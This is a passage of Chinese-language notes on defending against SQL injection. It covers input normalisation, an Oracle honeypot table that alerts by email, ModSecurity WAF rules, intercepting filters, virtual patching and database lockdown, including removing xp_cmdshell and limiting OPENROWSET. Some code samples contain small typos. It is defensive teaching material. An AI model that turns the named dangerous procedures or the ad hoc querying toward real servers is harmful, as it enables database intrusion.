<td align="center">plane 1 至ij 3</td>
</tr>
<tr>
<td align="center">[\xF 1 -\xF3][\x80-\xBF] {3}</td>
<td align="center">panel 4 到 15</td>
</tr>
<tr>
<td align="center">\xF4 [\x80-\x8F][\x80-\xBF] {2}</td>
<td align="center">panel 16</td>
</tr>
</tbody></table>
<p>检查完输入是有效的格式后，现在可以将它转换成可预见的格式。</p>
<p>在Java中，可以使用CharsetEncoder类或比较简单的getBytes()方法（Java 6及之后的版本）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">string ascii <span class="token operator">=</span> utf8<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"ISO-8859-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在C#中，可以使用Encoding.Converter类</p>
<pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">byte[] asciiBytes = Encoding.Convert(Encoding.UTF8,Encoding.ASCII,utf8Bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在PHP中，可以使用utf8_decode</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">ascii <span class="token operator">=</span> <span class="token function">utf8_decode</span><span class="token punctuation">(</span><span class="token variable">$utf8string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="通过设计来避免SQL注入的危险"><a href="#通过设计来避免SQL注入的危险" class="headerlink" title="通过设计来避免SQL注入的危险"></a>通过设计来避免SQL注入的危险</h3><h4 id="使用储存过程"><a href="#使用储存过程" class="headerlink" title="使用储存过程"></a>使用储存过程</h4><p>在大多数数据库中使用存储过程时都可以在数据库层配置访问控制。通过正确配置许可权限来保证攻击者无法访问数据库中的敏感信息。</p>
<h4 id="使用抽象层"><a href="#使用抽象层" class="headerlink" title="使用抽象层"></a>使用抽象层</h4><p>表示、业务逻辑和数据访问定义不同的层，从而将每一层的实现从总体设计中抽象出来。</p>
<h4 id="处理敏感数据"><a href="#处理敏感数据" class="headerlink" title="处理敏感数据"></a>处理敏感数据</h4><p>考虑数据库中敏感信息的存储和访问。</p>
<p>口令：如果可能的话，不应该在数据库中存储用户口令。比较安全的做法是存储每个用户口令的加盐（salted）单向哈希（使用SHA256这样的安全哈希算法）而不是口令本身。</p>
<p>信用卡及其他财务信息：应该使用认可的（比如FIPS认证过的）加密算法来对信用卡等信息进行加密，然后存储加密后的明细数据。</p>
<p>存档：如果未要求应用程序保存提交给它的所有敏感信息（例如个人可识别的信息）的完整历史记录，就应考虑每隔一段合理的时间就存档或清除这些不需要的信息。</p>
<h4 id="避免明显的对象名"><a href="#避免明显的对象名" class="headerlink" title="避免明显的对象名"></a>避免明显的对象名</h4><p>为关键对象（比如加密函数、口令列和信用卡列）选取名称时应该 格外小心，不要选取易被拆解的名字，如passwd</p>
<h4 id="创建honeypot-蜜罐"><a href="#创建honeypot-蜜罐" class="headerlink" title="创建honeypot(蜜罐)"></a>创建honeypot(蜜罐)</h4><p>如果希望在有人尝试从数据库读取口令时收到警告，可以创建一种带password列（包含假数据）的附加honeypot（蜜罐）表。如果假数据被选中，那么应用管理员将会收到一封e-mail。</p>
<p>在 Oracle中，可以使用虚拟专用数据库（Virtual Private Database, VPD）来实现</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--创建蜜罐表</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> app_user<span class="token punctuation">.</span>tblusers <span class="token punctuation">(</span><span class="token operator">is</span> number<span class="token punctuation">,</span> name varchar2<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password varchar2 <span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">--创建向管理员发送e-mail的策略函数</span>
<span class="token comment">--必须用另外一个模式来创建该函数，比如secuser</span>
<span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> secuser<span class="token punctuation">.</span><span class="token keyword">function</span> get_cust_id
p_schema <span class="token operator">in</span> varchar2<span class="token punctuation">,</span>
p_table <span class="token operator">in</span> varchar2
<span class="token punctuation">)</span>
<span class="token keyword">return</span> varchar2
<span class="token keyword">as</span>
v_connection UTL_SMTP<span class="token punctuation">.</span>CONNECTION<span class="token punctuation">;</span>
<span class="token keyword">begin</span>
v_connection :<span class="token operator">=</span> UTL_SMTP<span class="token punctuation">.</span>OPEN_CONNECTION<span class="token punctuation">(</span><span class="token string">'mailhost.victim.com'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_SMTP<span class="token punctuation">.</span>HELO<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'mailhost.victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_SMTP<span class="token punctuation">.</span>MAIL<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'app@victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_SMTP<span class="token punctuation">.</span>RCPT<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'admin@victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_SMTP<span class="token punctuation">.</span><span class="token keyword">DATA</span><span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'WARNING! SELECT PERFORMED ON HONEYPOT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
UTL_SMTP<span class="token punctuation">.</span>QUIT<span class="token punctuation">(</span>v_connection<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token string">'1=1'</span> <span class="token punctuation">;</span><span class="token comment">--总是显示整个表</span>
<span class="token keyword">end</span><span class="token punctuation">;</span>
<span class="token operator">/</span>
<span class="token comment">--将策略函数赋值给蜜罐表TBLUSERS</span>
<span class="token keyword">exec</span> dbms_rls<span class="token punctuation">.</span>add_policy <span class="token punctuation">(</span>
<span class="token string">'APP_USER'</span><span class="token punctuation">,</span>
<span class="token string">'TBLUSERS'</span><span class="token punctuation">,</span>
<span class="token string">'GET_CUST_ID'</span><span class="token punctuation">,</span>
<span class="token string">'SECUSER'</span><span class="token punctuation">,</span>
<span class="token string">''</span><span class="token punctuation">,</span>
<span class="token string">'SELECT, INSERT, UPDATE, DELETE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="附加的安全开发资源"><a href="#附加的安全开发资源" class="headerlink" title="附加的安全开发资源"></a>附加的安全开发资源</h4><ul>
<li><p>OWASP(Open Web Application Security Project，开放式 Web 应用安全项目<a target="_blank" rel="noopener" href="http://www.owasp.org/">owasp</a> </p>
</li>
<li><p>CWE/SANS 2009 年度25大最危险编程错误(<a target="_blank" rel="noopener" href="http://cwe.mitre.org/top25/index.html)%E6%98%AF">http://cwe.mitre.org/top25/index.html)是</a> MITRE (SANS协会)和许多高级安全专家通力合作的成果</p>
</li>
<li><p>SANS软件安全协会(<a target="_blank" rel="noopener" href="http://www.sans-ssi.org)提供了安全开发方面的培训和证书,以及大量由sans认证检验员提供的参考信息和研究资料./">www.sans-ssi.org)提供了安全开发方面的培训和证书，以及大量由SANS认证检验员提供的参考信息和研究资料。</a></p>
</li>
<li><p>Oracle 的 SQL 注入攻击防御指南(<a target="_blank" rel="noopener" href="http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9C%89%E5%8A%A9%E4%BA%8E%E5%85%8D%E5%8F%97SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E6%9C%AF%E3%80%82">http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)介绍了很多有助于免受SQL注入攻击的工具和技术。</a></p>
</li>
<li><p>SQLSecurity.com(<a target="_blank" rel="noopener" href="http://www.sqlsecurity.com)是一个致力于/">www.sqlsecurity.com)是一个致力于</a> Microsoft SQL Server 安全的站点</p>
</li>
<li><p>Red-Database-Security(<a target="_blank" rel="noopener" href="http://www.red-database-security.com是一个专门研究/">www.red-database-security.com是一个专门研究</a> Oracle 安全的公司。它的网站上包含了很多可供下载的关于Oracle安全的报告和白皮书。</p>
</li>
<li><p>Pete Finnegan Limited(<a target="_blank" rel="noopener" href="http://petefinnigan.com)也提供了大量用于保证/">http://petefinnigan.com)也提供了大量用于保证</a> Oracle 数据库安全的信息。</p>
</li>
</ul>
<h2 id="平台层防御"><a href="#平台层防御" class="headerlink" title="平台层防御"></a>平台层防御</h2><h3 id="使用运行时保护"><a href="#使用运行时保护" class="headerlink" title="使用运行时保护"></a>使用运行时保护</h3><h4 id="Web应用防火墙"><a href="#Web应用防火墙" class="headerlink" title="Web应用防火墙"></a>Web应用防火墙</h4><p>Web应用防火墙（WAF）是一种网络设备或是一种将安全特性添加到Web应用的基于软件的解决方案。</p>
<p>基于软件的WAF通常是一些以最小化配置嵌入到Web服务器或应用程序中的模块，它们的主要好处是Web基础结构仍保持不变，并且能够无缝地处理HTTP/HTTPS通信，因为它们运行在承载Web或应用程序的进程中。</p>
<p>WAF 的事实标准是开源的 <a target="_blank" rel="noopener" href="http://www.modsecurity.org/">ModSecurity</a>.ModSecurity被开发成 Apache的一个模块。如果将Apache Web服务器配置成反向代理，那么ModSecurity实际上可以保护任何Web应用，可以使用ModSecurity来实现攻击预防、监控、入侵检测和一般的应用程序加固。</p>
<p>我们将使用ModSecurity作为主要的例子来介绍使用WAF时在检测并预防SQL注入方面的主要特征。</p>
<h5 id="可配置规则集"><a href="#可配置规则集" class="headerlink" title="可配置规则集"></a>可配置规则集</h5><p>WAF必须高度可配置才能适应各种不同的情况。</p>
<p>ModSecurity的威力在于它的规则语言上，这种语言是配置指令和应用到HTTP请求和响应的一种简单编程语言的组合。ModSecurity的SecRule 指令的通用语法，如下所示：</p>
<pre class="line-numbers language-SecRules" data-language="SecRules"><code class="language-SecRules">SecRule VARIABLE OPERATOR [ACTIONS]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>VARIABLE属性告诉ModSecurity到哪里访问请求或响应，OPERATOR属性告诉ModSecurity如何检查数据，ACTIONS属性确定出现匹配时做哪些操作。ACTIONS属性是可选的规则选项， 它可以定义默认的全局动作。</p>
<p>ModSecurity核心规则集(ModSecurity Core Rule Set)的 Generic Attacks 规则文件(modsecurity_crs_40_generic_attacks.conf)中的一条实际的黑名单SQL注入规则</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;Location /apps/script.php&gt;
SecRule &amp;ARGS "!@eq 1"
SecRule ARGS_NAMES "!Astatid$"
SecRule ARGS:statID "!^\d{1,3}$"
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Location</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="请求覆盖范围"><a href="#请求覆盖范围" class="headerlink" title="请求覆盖范围"></a>请求覆盖范围</h5><p>攻击有效载荷可以出现在HTTP请求的任何位置，比如查询字符串、POST数据、cookie、自定义的或是标准的HTTP头(例如,Referer, Server等)，以及URL路径的部分内容中。ModSecurity能够处理所有这些情况。下面列出了 ModSecurity支持的变量列表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">REQUEST BASENAME
REQUEST BODY
REQUEST BODY LENGTH
REQUEST COOKIES
REQUEST COOKIES NAMES
REQUEST FILENAME
REQUEST HEADERS
REQUEST HEADERS NAMES
REQUEST LINE
REQUEST METHOD
REQUEST PROTOCOL
REQUEST URI
REQUEST URI RAW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="请求标准化"><a href="#请求标准化" class="headerlink" title="请求标准化"></a>请求标准化</h5><p>ModSecurity能够应对任何复杂的编码场景。它支持大量转换函数，可以将这些函数按任意顺序多次应用到每条规则上。下面列出了 ModSecurity参考手册中的转换函数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">base64Decode
base64DecodeExt
base64Encode
cmdLine
compressWhitespace
cssDecode
escapeSeqDecode
hexDecode
hexEncode
htmlEntityDecode
jsDecode
length
lowercase
md5
none
normalisePath
normalisePathwin
parityEven7bit
parityodd7bit
parityzero7bit
removeNulls
removeWhitespace
replaceComments
removeCommentsChar
removeComments
replaceNulls
urlDecode
urlDecodeUni
urlEncode
sha1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果内置函数因为某个原因无法满足需求，可以使用ModSecurity支持的Lua脚本语言来构建自定义的转换函数。</p>
<h5 id="响应分析"><a href="#响应分析" class="headerlink" title="响应分析"></a>响应分析</h5><p>抑制关键信息泄露，比如详细的SQL错误消息。</p>
<p>ModSecurity核心规则集的Outbound规则文件(modsecurity_ crs_50_ outbound.conf)中的一条实际的带外(outbound)规则</p>
<p>如果响应中的消息成功匹配了正则表达式(表明产生了SQL错误)，ModSecurity可以做出适当的响应，比如禁止将错误返回给攻击者，或者提供替换的错误编码或错误消息以迷惑自动客户端和扫描器。</p>
<h5 id="入侵检测能力"><a href="#入侵检测能力" class="headerlink" title="入侵检测能力"></a>入侵检测能力</h5><p>WAF应该可以被动监视应用的行为，遇到可疑的行为时能采用行动，并能在SQL注入事件之后为取证分析(forensic analysis)保持一个不可否认的事件日志。</p>
<p>使用ModSecurity可以阻止SQL注入攻击、修复已知的SQL注入漏洞、检测攻击企图并抑制那些通常会为SQL注入漏洞利用提供便利的SQL错误消息。</p>
<h4 id="截断过滤器"><a href="#截断过滤器" class="headerlink" title="截断过滤器"></a>截断过滤器</h4><p>过滤器是WAF的独立模块，可添加新过滤器</p>
<p>过滤器适合执行跨请求和响应（与核心应用逻辑是松耦合）的集中的、可重复的任务。过滤器还适用于输入验证、将请求/响应记录到日志以及转换输出响应等安全功能。</p>
<h5 id="Web服务器过滤器"><a href="#Web服务器过滤器" class="headerlink" title="Web服务器过滤器"></a>Web服务器过滤器</h5><p>可以将过滤器实现成Web服务器模块/插件，它们能对核心请求和响应进行扩展以便处理 Web服务器平台的API。Apache、 Netscape（Oracle/Sun）、IIS（Intemet信息服务）等流行的Web服务器平台均支持这种架构。</p>
<p>ModSecurity是一种能够提供相当多的SQL注入保护的Apache API模块。UrlScan和WebKnight，它们是集成到IIS Web服务器平台的ISAPI过滤器，能够提供SQL注入保护。</p>
<h5 id="应用程序过滤器"><a href="#应用程序过滤器" class="headerlink" title="应用程序过滤器"></a>应用程序过滤器</h5><p>也可以使用Web应用的编程语言或框架来实现过滤器。其架构与Web服务器插件的架构类似：模块代码在请求和响应经历一系列阶段的过程时执行。可以使用ASP.NET的 System.Web.IHttpModule和javax.servlet.Filter接口来实现过滤器模式，之后可以在不修改代码的前提下将它们添加到应用中并在应用程序的配置文件中显式地激活它们。</p>
<p>下面列出了自定义的J2EE Filter类的doFilter方法的示例代码。每个请求/响应对会因为J2EE Web源（JSP文件、servlet等）的请求而调用该方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SqlInjDetectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> res<span class="token punctuation">,</span>
chain filterchain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>
<span class="token comment">//检查请求数据，寻找恶意字符</span>
<span class="token function">doDetectSqlI</span><span class="token punctuation">(</span>rep<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//调用链中的下一个过滤器</span>
chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>应用程序过滤器确实适合于运行时（runtime）保护，开发时它们可以独立于应用程序，部署时则可以作为独立的.dll或.jar文件并且能立即激活。</p>
<h5 id="使用脚本语言实现过滤器模式"><a href="#使用脚本语言实现过滤器模式" class="headerlink" title="使用脚本语言实现过滤器模式"></a>使用脚本语言实现过滤器模式</h5><p>就PHP Web应用而言，可以在php.ini文件中利用auto_prepend_file和auto_append_file配置指令，这些指令指向那些在每个请求的PHP脚本执行之前和之后才执行的PHP文件。添加的逻辑在各种HTTP请求集合（查询字符串、POST、cookie、头等）间循环，必要时可以进行验证和或日志记录。</p>
<p>另一种用于PHP和经典ASP应用的方法是使用包含文件（include file）。这需要通过在每个应用程序页面添加include指令来修改代码。同样，被包含的逻辑也在各种HTTP请求集合间循环，必要时也可以进行验证和或日志记录。</p>
<h5 id="过滤Web服务消息"><a href="#过滤Web服务消息" class="headerlink" title="过滤Web服务消息"></a>过滤Web服务消息</h5><p>使用自定义的输入和输出过滤器同样可以很容易地将截断过滤器模式应用于XML Web服务。</p>
<h4 id="不可编辑与可编辑的输入保护"><a href="#不可编辑与可编辑的输入保护" class="headerlink" title="不可编辑与可编辑的输入保护"></a>不可编辑与可编辑的输入保护</h4><p>输入验证策略，将应用程序的输入分成可编辑的和不可编辑的两类，并且锁定不可编辑的输入以便无法操作它们。不可编辑输入是指最终用户不需要直接修改的输入，比如隐藏表单字段、URI和查询字符串参数、cookie等。该策略隐含的原理是：应用程序应该只允许用户执行用户接口暴露给他们的动作。</p>
<p>实现这种策略的技术范例是HDIV(HTTP Data Integrity Validator, HTTP数据完整性验证器) 和SPF。</p>
<h4 id="URL策略与页面层策略"><a href="#URL策略与页面层策略" class="headerlink" title="URL策略与页面层策略"></a>URL策略与页面层策略</h4><p>不修改源代码的前提下，为易受攻击的URL或页面打虚拟补丁的技术。</p>
<h5 id="页面覆写-override"><a href="#页面覆写-override" class="headerlink" title="页面覆写(override)"></a>页面覆写(override)</h5><p>如果页面易受攻击且需要替换，那么可以创建一个在运行时提交的替代页面或类，通过修改Web应用配置文件中的配置可以实现这种替换。在ASP.NET应用中，则可以使用HTTP handler (处理程序)实现这一任务。</p>
<p>下面展示了一自定义HTTP handler的配置，它用于处理发送给PageVulnToSqll.aspx页面而非易受攻击页面的请求。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpHandlers</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">verb</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span>
<span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PageVulnToSqlI.aspx<span class="token punctuation">"</span></span>
<span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Chapter9.Examples.SecureAspxHandler, Subclass<span class="token punctuation">"</span></span>
<span class="token attr-name">validate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>httpHandlers</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将易受攻击的URL映射到一个通过安全方式处理请求的servlet上</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>SecureServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>chapter9.examples.SecureServletClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servletclass</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--&lt;servlet-name&gt;ServletVulnToSqli&lt;/servlet-name&gt;--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>SecureServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/ServletVulnToSqli<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="URL重写"><a href="#URL重写" class="headerlink" title="URL重写"></a>URL重写</h5><p>URL重写(rewrite)是一种与页面覆写(override)类似的技术。可以通过配置Web服务器或应用框架来接收那些发送给易受攻击页面或URL的请求，并将它们重定向到该页面的替代版本。 页面的新版本通过一种安全的方式来实现原始页面逻辑。</p>
<h5 id="资源代理与封装"><a href="#资源代理与封装" class="headerlink" title="资源代理与封装"></a>资源代理与封装</h5><p>可以将资源代理与封装和页面覆写或URL重写结合使用，以便将替换页面需要的自定义编码数量降至最低。替代页面在处理重写请求时会循环访问请求参数(查询字符串、POST、 cookie等)并执行必需的验证。</p>
<h4 id="面向方面编程"><a href="#面向方面编程" class="headerlink" title="面向方面编程"></a>面向方面编程</h4><p>面向方面编程(Aspect-Oriented Programming, AOP)是一种构建可应用到应用程序范围内的通用可重用例程的技术。在开发过程中，它有利于核心应用程序逻辑和通用、重复任务(输入 验证、记录日志、错误处理等)的分离。运行时，可以使用AOP来热补(hot-patch)易受SQL注入攻击的应用程序，也可以无须修改底层源代码就直接将入侵检测和日志审查功能嵌入到应用程序中。</p>
<h4 id="应用程序入侵检测系统"><a href="#应用程序入侵检测系统" class="headerlink" title="应用程序入侵检测系统"></a>应用程序入侵检测系统</h4><p>可以使用传统的基于网络的入侵检测系统(Intrusion Detection Systems, IDS)来检测SQL注入攻击。</p>
<p>WAF作为一种非常好的IDS，因为它运行在应用层并且可针对受保护 的应用程序进行微调。</p>
<p>另一种选择是使用PHPIDS<a target="_blank" rel="noopener" href="http://phpids.org,phpids不会过滤或审查输入,它检测攻击并根据配置来采取措施./">http://phpids.org，PHPIDS不会过滤或审查输入，它检测攻击并根据配置来采取措施。</a></p>
<h4 id="数据库防火墙"><a href="#数据库防火墙" class="headerlink" title="数据库防火墙"></a>数据库防火墙</h4><p>防火墙，它本质上是一种介于应用程序和数据库之间的代理服务器。应用程序连接到数据库防火墙并像正常连接到数据库那样发送查询。 数据库防火墙分析预期的查询，如果认为是安全的，就将它传递给数据库服务器加以执行。反之，如果认为是恶意的，就阻止运行该查询。数据库防火墙还可以通过以被动模式监视连接和向管理员发出可疑行为警告来作为恶意数据库行为的应用层IDS。</p>
<h3 id="确保数据库安全"><a href="#确保数据库安全" class="headerlink" title="确保数据库安全"></a>确保数据库安全</h3><h4 id="锁定应用程序数据"><a href="#锁定应用程序数据" class="headerlink" title="锁定应用程序数据"></a>锁定应用程序数据</h4><h5 id="使用较低权限的数据库登录"><a href="#使用较低权限的数据库登录" class="headerlink" title="使用较低权限的数据库登录"></a>使用较低权限的数据库登录</h5><p>应用程序连接到数据库服务器的登录语境应该是：拥有的许可权限仅仅只能执行需要的应用程序任务。</p>
<h5 id="隔离数据库登录"><a href="#隔离数据库登录" class="headerlink" title="隔离数据库登录"></a>隔离数据库登录</h5><p>对于既需要写访问也需要读访问数据库的应用程序，可以使用多个用户登录数据库，这是对使用最小权限登录数据库的扩展。</p>
<h5 id="撤销public许可"><a href="#撤销public许可" class="headerlink" title="撤销public许可"></a>撤销public许可</h5><p>每种数据库服务器平台均拥有通常称为公共（public）角色的默认角色（所有登录均属于这种角色）。它包含一个默认的许可集，其中包括对系统对象的访问。公共角色还被赋予了执行内置系统存储过程、包和用于管理目的的功能的许可。</p>
<p>应尽可能多地撤销系统对象的公共角色许可。此外，还必须撤销为自定义数据库对象（比如应用程序使用的表和存储过程）赋予的公共角色的冗余许可，必要时可以为自定义角色分配数据库许可。可以使用这些角色来为特定的用户和组赋予默认的访问级别。</p>
<h5 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h5><p>从安全角度看，应该将应用程序的SQL查询封装到存储过程中并且只能为这些对象赋予EXECUTE许可。可以撤销底层对象的所有其他许可，比如SELECT，INSERT等。就SQL注入而言，最低权限的数据库登录（应用程序使用的存储过程只拥有EXECUTE许可）可保证更难 向浏览器返回任意结果集。</p>
<h5 id="使用强加密技术来保护存储的敏感数据"><a href="#使用强加密技术来保护存储的敏感数据" class="headerlink" title="使用强加密技术来保护存储的敏感数据"></a>使用强加密技术来保护存储的敏感数据</h5><p>要想避免数据库中敏感数据的非授权查看，一种关键的控制就是使用强加密技术。可选的方法包括存储数据的数学哈希（而非数据本身）或者存储使用对称算法加密后的数据。</p>
<p>如果不需要存储数据本身，那么请考虑一种正确的衍生数学哈希。</p>
<p>如果必须存储敏感数据，请使用强对称加密算法来进行保护，比如AES（Advanced Encryption Standard,高级加密标准）或三重DES（Data Encryption Standard,数据加密标准）。加密敏感数据的主要挑战是将密钥保存到攻击者无法轻易访问到的位置。</p>
<h5 id="维护审查跟踪"><a href="#维护审查跟踪" class="headerlink" title="维护审查跟踪"></a>维护审查跟踪</h5><p>维护对应用程序数据库对象的访问审查跟踪非常关键。</p>
<h5 id="Oracle错误触发器"><a href="#Oracle错误触发器" class="headerlink" title="Oracle错误触发器"></a>Oracle错误触发器</h5><p>Oracle提供了一种名为数据库触发器的特性。当出现特定的事件时，比如使用DDL（数据定义语言，比如DDL触发器）创建对象时，或者出现数据库错误（比如ERROR触发器）时，这些触发器会在数据库范围内激活，从而提供了一种简易的方法来检测SQL注入尝试。</p>
<h4 id="锁定数据库服务器"><a href="#锁定数据库服务器" class="headerlink" title="锁定数据库服务器"></a>锁定数据库服务器</h4><h5 id="额外的系统对象锁定"><a href="#额外的系统对象锁定" class="headerlink" title="额外的系统对象锁定"></a>额外的系统对象锁定</h5><p>除了撤销系统对象(system object)上的公共对象许可外，请考虑采取额外的步骤来进一步锁定特权对象的访问，比如用于系统管理的对象、执行操作系统命令和产生网络连接的对象。</p>
<p>请考虑通过以下措施来施加约束：确保未向应用程序角色赋予多余冗余许可、通过服务器配置禁用访问系统范围内的特权对象，或者彻底将这些功能从服务器删除(避免重新启用带来的权限提升)。</p>
<p>在Oracle中，应该约束运行操作系统的命令以及从数据库访问操作系统级文件的能力。</p>
<p>在SQL Server中，应该考虑删除危险的存储过程，比如xp_cmdshell以及与xp_reg*、xp_ instancereg*和sp_OA*匹配的存储过程。</p>
<h5 id="约束即席查询（ad-hoc-querying）"><a href="#约束即席查询（ad-hoc-querying）" class="headerlink" title="约束即席查询（ad hoc querying）"></a>约束即席查询（ad hoc querying）</h5><p>Microsoft SQL Server支持一种名为OPENROWSET的命令来查询远程和本地数据源。远程查询的有用之处在于可利用它来攻击所连网络上的其他数据库服务器。使用这一功能查询本地服务器，攻击者可以在更高特权的SQL Server数据库登录语境中重新向服务器发出验证。</p>
<p>Oracle支持借助数据库链接（database link）的远程服务器的即席查询。</p>
<h5 id="增强对验证周边的控制"><a href="#增强对验证周边的控制" class="headerlink" title="增强对验证周边的控制"></a>增强对验证周边的控制</h5><p>应该复查所有数据库登录，禁用或删除不必要的内容，比如默认账户。</p>
<h5 id="在最低权限的操作系统账户语境中运行"><a href="#在最低权限的操作系统账户语境中运行" class="headerlink" title="在最低权限的操作系统账户语境中运行"></a>在最低权限的操作系统账户语境中运行</h5><p>如果攻击者能够突破数据库服务器语境并获取底层操作系统的访问权，那么此时是否处于最低权限的操作系统账户语境中将非常关键。</p>
